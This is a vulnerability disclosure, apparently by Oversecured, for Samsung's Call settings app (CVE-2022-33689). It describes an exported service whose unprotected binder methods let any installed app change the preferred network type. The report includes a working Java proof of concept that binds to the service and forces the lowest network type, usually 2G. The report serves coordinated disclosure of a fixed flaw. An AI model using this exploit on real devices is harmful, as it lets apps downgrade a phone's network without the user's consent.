# Details

<table>
    <tr>
        <td>Name</td>
        <td>Call settings</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.app.telephonyui</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.20</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.08.05</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>High</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-33689">CVE-2022-33689</a> (SVE-2022-0681)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$3200</td>
    </tr>
</table>

# Description

Oversecured found a vulnerability to change device settings in the Call settings system app:
![](04%20رئيسية/Samsung%20Vulnerabilities/008.%20Call%20settings%20—%20Changing%20preferred%20network%20type/Oversecured_report.png)

The exported service `com.samsung.android.app.telephonyui.netsettings.ui.preference.service.BixbyRoutineNetworkSetService` exposed its binder to all the apps installed on the same device. During the investigation it turned out that it contains unprotected AIDL methods to get the list of available network types and to change the preffered network type to a custom one.

**Proof of Concept**
We created a proof of concept for obtaining the list of available network types and setting the lowest-priority one (usually 2G).

```java
private ServiceConnection mServiceConnection = new ServiceConnection() {
    public void onServiceConnected(ComponentName cName, IBinder service) {
        processBinder(service);
    }

    public void onServiceDisconnected(ComponentName cName) {
    }
};

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Intent i = new Intent();
    i.setClassName("com.samsung.android.app.telephonyui", "com.samsung.android.app.telephonyui.netsettings.ui.preference.service.BixbyRoutineNetworkSetService");
    bindService(i, mServiceConnection, BIND_AUTO_CREATE);
}

private void processBinder(IBinder binder) {
    try {
        // listing available network types
        Parcel parcel1 = Parcel.obtain();
        parcel1.writeInterfaceToken(binder.getInterfaceDescriptor());

        Parcel reply = Parcel.obtain();

        binder.transact(2, parcel1, reply, 0);
        reply.readException();

        // setting the lowest network type
        int[] types = reply.createIntArray();
        int lowestNetwork = types[types.length - 1];
        Parcel parcel2 = Parcel.obtain();
        parcel2.writeInterfaceToken(binder.getInterfaceDescriptor());
        parcel2.writeInt(lowestNetwork);

        reply = Parcel.obtain();

        binder.transact(3, parcel2, reply, 0);
        reply.readException();
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}
```
